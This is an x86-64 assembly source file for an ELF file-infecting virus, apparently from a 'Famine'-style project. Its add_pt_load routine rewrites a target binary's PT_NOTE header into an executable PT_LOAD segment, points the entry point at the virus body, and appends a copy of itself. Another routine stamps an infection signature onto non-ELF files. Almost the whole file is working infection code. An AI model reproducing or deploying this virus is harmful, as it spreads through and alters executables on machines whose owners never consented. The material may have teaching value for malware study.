%include "include.s"
%include "utils.s"
%include "check_elf_64_exec.s"
%include "list_files_recursive.s"

; Syscall numbers for x86-64
%define SYS_WRITE       1
%define SYS_CLOSE       3

; Constants for virus operation
%define VIRUS_STACK_SIZE  16384  ; Stack space for virus buffers

%include "virus.s"

section .bss
    path_buffer:    resb PATH_BUFF_SIZE       ; buffer for building full path
    file_list:      resb MAX_FILES * FILE_ENTRY_SIZE  ; storage for file paths
    file_count:     resq 1                    ; number of files stored
    elf_header_buf: resb 64                   ; buffer for reading ELF header
    elf_phdr_buf:   resb ELF64_PHDR_SIZE * MAX_PHDRS  ; buffer for program headers
    sig_check_buf:  resb BUFFER_SIZE          ; buffer for checking signature
    virus_copy_buf: resb 16384                ; buffer for virus code to inject
    random_suffix:  resb RANDOM_SUFFIX_LEN    ; buffer for random signature suffix
    
    ; Buffers for process check
    proc_dirent_buf: resb 512                 ; buffer for getdents64
    proc_path_buf:   resb 256                 ; buffer for building /proc/[pid]/status path
    proc_status_buf: resb 128                 ; buffer for reading status file

section .data
    newline:              db 10               ; newline character
    msg_valid:            db " is a valid elf64 executable", 10, 0
    msg_invalid:          db " is not a valid elf64 executable", 10, 0
    msg_add_pt_load:      db "add pt_load", 10, 0
    msg_infected:         db "infected ", 0
    msg_already_infected: db "already infected", 10, 0
    msg_debugging:        db "DEBUGGING..", 10, 0
    proc_self_exe:        db "/proc/self/exe", 0

section .text
global _start
global list_files_recursive

; ============================================
; Non-virus code (regular Famine operation)
; ============================================

; ============================================
; add_pt_load(char *filepath)
; rdi = pointer to file path
; ============================================
add_pt_load:
    push rbp
    mov rbp, rsp
    sub rsp, 80
    push r12
    push r13
    push r14
    push r15
    push rbx

    mov r12, rdi                ; file path

    ; Get the virus base address
    call .get_virus_base
.get_virus_base:
    pop r15
    sub r15, .get_virus_base - virus_start

    ; Open file for read/write
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r12
    mov edx, O_RDWR
    xor r10d, r10d
    syscall

    test rax, rax
    js .add_pt_load_fail

    mov r13, rax                ; fd

    ; Get file size
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    mov edx, SEEK_END
    syscall

    test rax, rax
    js .add_pt_load_close_fail

    mov [rbp-8], rax            ; file size

    ; Seek to beginning
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    syscall

    ; Read ELF header
    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rel elf_header_buf]
    mov edx, 64
    syscall

    cmp rax, 64
    jl .add_pt_load_close_fail

    ; ============================================
    ; Check if file is already infected by searching for signature
    ; ============================================
    ; Seek to beginning
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    syscall
    
    xor rbx, rbx                ; current file position
    mov r14, [rbp-8]            ; file size

.apt_sig_check_loop:
    ; Read a chunk of the file
    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rel sig_check_buf]
    mov edx, BUFFER_SIZE
    syscall

    test rax, rax
    jle .apt_sig_check_done     ; EOF or error, not found

    ; Search for signature in buffer
    push rax                    ; save bytes_read
    lea rdi, [rel sig_check_buf]
    mov rsi, rax                ; bytes_read
    lea rdx, [rel signature]
    mov rcx, signature_len
    call search_substring
    
    pop rcx                     ; restore bytes_read into rcx
    
    ; If found, file is already infected
    test rax, rax
    jnz .add_pt_load_close_fail ; skip - already infected

    ; Update position and check if more to read
    add rbx, rcx                ; bytes read
    cmp rbx, r14                ; compare with file size
    jge .apt_sig_check_done     ; done reading

    ; Seek back slightly to handle signatures that span chunk boundaries
    mov rsi, rbx
    sub rsi, signature_len
    add rsi, 1
    test rsi, rsi
    js .apt_sig_check_done      ; shouldn't happen, but be safe
    
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor edx, edx                ; SEEK_SET
    syscall
    
    test rax, rax
    js .apt_sig_check_done
    
    mov rbx, rax                ; update position
    jmp .apt_sig_check_loop

.apt_sig_check_done:
    ; File is not infected, proceed with infection
    ; Seek back to beginning to read ELF header again
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    syscall
    
    ; Read ELF header again
    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rel elf_header_buf]
    mov edx, 64
    syscall

    ; Get and save original entry point
    lea rdi, [rel elf_header_buf]
    mov rax, [rdi + e_entry]
    mov [rbp-24], rax           ; original entry

    ; Get e_phoff
    mov r14, [rdi + e_phoff]

    ; Get e_phnum
    movzx ebx, word [rdi + e_phnum]

    ; Get e_phentsize
    movzx eax, word [rdi + e_phentsize]
    mov [rbp-40], rax

    ; Seek to phdrs
    mov eax, SYS_LSEEK
    mov edi, r13d
    mov rsi, r14
    xor edx, edx
    syscall

    ; Read all phdrs
    mov rax, rbx
    imul rax, [rbp-40]
    mov rdx, rax

    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rel elf_phdr_buf]
    syscall

    ; Find PT_NOTE
    lea rdi, [rel elf_phdr_buf]
    xor rcx, rcx

.find_note_loop:
    cmp rcx, rbx
    jge .add_pt_load_close_fail

    mov rax, rcx
    imul rax, [rbp-40]
    lea rsi, [rdi + rax]

    cmp dword [rsi + p_type], PT_NOTE
    je .found_note_main

    inc rcx
    jmp .find_note_loop

.found_note_main:
    ; First, find the highest vaddr in existing LOAD segments
    ; Save rsi (pointer to PT_NOTE phdr) on stack
    push rsi
    
    ; Scan all phdrs to find max vaddr + memsz
    lea rdi, [rel elf_phdr_buf]
    xor rcx, rcx                ; index
    xor r8, r8                  ; max_vaddr_end = 0

.find_max_vaddr_main:
    cmp rcx, rbx                ; rbx = e_phnum
    jge .found_max_vaddr_main

    mov rax, rcx
    imul rax, [rbp-40]          ; * e_phentsize
    lea rsi, [rdi + rax]

    ; Check if this is a LOAD segment
    cmp dword [rsi + p_type], PT_LOAD
    jne .next_phdr_main

    ; Get vaddr + memsz
    mov r9, [rsi + p_vaddr]
    add r9, [rsi + p_memsz]
    cmp r9, r8
    jle .next_phdr_main
    mov r8, r9                  ; update max

.next_phdr_main:
    inc rcx
    jmp .find_max_vaddr_main

.found_max_vaddr_main:
    ; r8 now contains the highest vaddr + memsz
    ; We need p_vaddr to be congruent to p_offset modulo page size
    ; p_offset = file_size, so: p_vaddr % 0x1000 == file_size % 0x1000
    
    ; First, get the file size's page offset
    mov rax, [rbp-8]            ; file size
    and rax, 0xfff              ; file_size % page_size
    
    ; Align r8 (max_vaddr_end) up to next page boundary, then add the offset
    add r8, 0xfff
    and r8, ~0xfff              ; page-aligned
    add r8, rax                 ; add file offset within page
    
    ; Restore rsi (pointer to PT_NOTE phdr)
    pop rsi

    ; Convert PT_NOTE to PT_LOAD
    mov dword [rsi + p_type], PT_LOAD
    mov dword [rsi + p_flags], PF_R | PF_W | PF_X

    mov rax, [rbp-8]            ; file size
    mov qword [rsi + p_offset], rax

    ; p_vaddr = properly aligned value in r8
    mov qword [rsi + p_vaddr], r8
    mov qword [rsi + p_paddr], r8
    mov [rbp-32], r8            ; save new vaddr

    mov rax, virus_end - virus_start
    mov qword [rsi + p_filesz], rax
    mov qword [rsi + p_memsz], rax
    mov qword [rsi + p_align], 0x1000

    ; Write back phdrs
    mov eax, SYS_LSEEK
    mov edi, r13d
    mov rsi, r14
    xor edx, edx
    syscall

    mov rax, rbx
    imul rax, [rbp-40]
    mov rdx, rax

    mov eax, SYS_WRITE
    mov edi, r13d
    lea rsi, [rel elf_phdr_buf]
    syscall

    ; Update entry point
    mov rax, [rbp-32]
    add rax, _start - virus_start
    lea rdi, [rel elf_header_buf]
    mov [rdi + e_entry], rax

    ; Write ELF header
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    syscall

    mov eax, SYS_WRITE
    mov edi, r13d
    lea rsi, [rel elf_header_buf]
    mov edx, 64
    syscall

    ; Copy virus to buffer and patch entry
    lea rsi, [rel virus_start]
    lea rdi, [rel virus_copy_buf]
    mov rcx, virus_end - virus_start

.copy_virus_main:
    test rcx, rcx
    jz .copy_done_main
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    dec rcx
    jmp .copy_virus_main

.copy_done_main:
    ; Patch original entry
    ; For PIE binaries, store offset from our _start to original entry
    lea rdi, [rel virus_copy_buf]
    mov rax, [rbp-24]           ; original entry point
    mov rcx, [rbp-32]           ; our new vaddr
    add rcx, _start - virus_start  ; add offset to _start
    sub rax, rcx                ; offset = original_entry - our_entry
    mov [rdi + original_entry_storage - virus_start], rax

    ; Write virus to end of file
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    mov edx, SEEK_END
    syscall

    mov eax, SYS_WRITE
    mov edi, r13d
    lea rsi, [rel virus_copy_buf]
    mov edx, virus_end - virus_start
    syscall

    ; Close file
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

%ifdef VERBOSE_MODE
    ; Print infected message
    lea rdi, [rel msg_infected]
    call print_string
    mov rdi, r12
    call print_string
    mov eax, SYS_WRITE
    mov edi, STDOUT
    lea rsi, [rel newline]
    mov edx, 1
    syscall
%endif

    jmp .add_pt_load_done

.add_pt_load_close_fail:
%ifdef VERBOSE_MODE
    lea rdi, [rel msg_err_pt_load_close]
    call print_string
%endif
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

.add_pt_load_fail:
.add_pt_load_done:
    pop rbx
    pop r15
    pop r14
    pop r13
    pop r12
    add rsp, 80
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; process_non_elf_file
; rdi = filepath
; ============================================
process_non_elf_file:
    push rbp
    mov rbp, rsp
    push r12
    push r13
    push r14
    push r15
    push rbx

    mov r12, rdi

    ; Open file
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r12
    xor edx, edx
    xor r10d, r10d
    syscall

    test rax, rax
    js .process_done

    mov r13, rax

    ; Get file size
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    mov edx, SEEK_END
    syscall

    test rax, rax
    jle .process_close_and_append

    mov r14, rax

    ; Seek to beginning
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    syscall

    xor r15, r15

.process_sig_read_loop:
    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rel sig_check_buf]
    mov edx, BUFFER_SIZE
    syscall

    test rax, rax
    jle .process_close_and_append

    mov rbx, rax

    lea rdi, [rel sig_check_buf]
    mov rsi, rbx
    lea rdx, [rel signature]
    mov rcx, signature_len
    call search_substring

    test rax, rax
    jnz .process_already_infected

    add r15, rbx
    cmp r15, r14
    jge .process_close_and_append

    mov rsi, r15
    sub rsi, signature_len
    add rsi, 1
    test rsi, rsi
    js .process_close_and_append

    mov eax, SYS_LSEEK
    mov edi, r13d
    xor edx, edx
    syscall

    test rax, rax
    js .process_close_and_append

    mov r15, rax
    jmp .process_sig_read_loop

.process_already_infected:
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

%ifdef VERBOSE_MODE
    lea rdi, [rel msg_already_infected]
    call print_string
%endif
    jmp .process_done

.process_close_and_append:
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

    ; Generate random suffix before opening file for append
    call generate_random_suffix

    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r12
    mov edx, O_WRONLY | O_APPEND
    xor r10d, r10d
    syscall

    test rax, rax
    js .process_done

    mov r13, rax

    ; Write base signature
    mov eax, SYS_WRITE
    mov edi, r13d
    lea rsi, [rel signature]
    mov edx, signature_len
    syscall

    test rax, rax
    js .process_write_failed

    ; Write random suffix
    mov eax, SYS_WRITE
    mov edi, r13d
    lea rsi, [rel random_suffix]
    mov edx, RANDOM_SUFFIX_LEN
    syscall

    test rax, rax
    js .process_write_failed

    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

%ifdef VERBOSE_MODE
    lea rdi, [rel msg_infected]
    call print_string
    mov rdi, r12
    call print_string
    mov eax, SYS_WRITE
    mov edi, STDOUT
    lea rsi, [rel newline]
    mov edx, 1
    syscall
%endif
    jmp .process_done

.process_write_failed:
%ifdef VERBOSE_MODE
    lea rdi, [rel msg_err_write_failed]
    call print_string
%endif
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

.process_done:
    pop rbx
    pop r15
    pop r14
    pop r13
    pop r12
    mov rsp, rbp
    pop rbp
    ret


_end:
    mov eax, SYS_EXIT
    xor edi, edi
    syscall
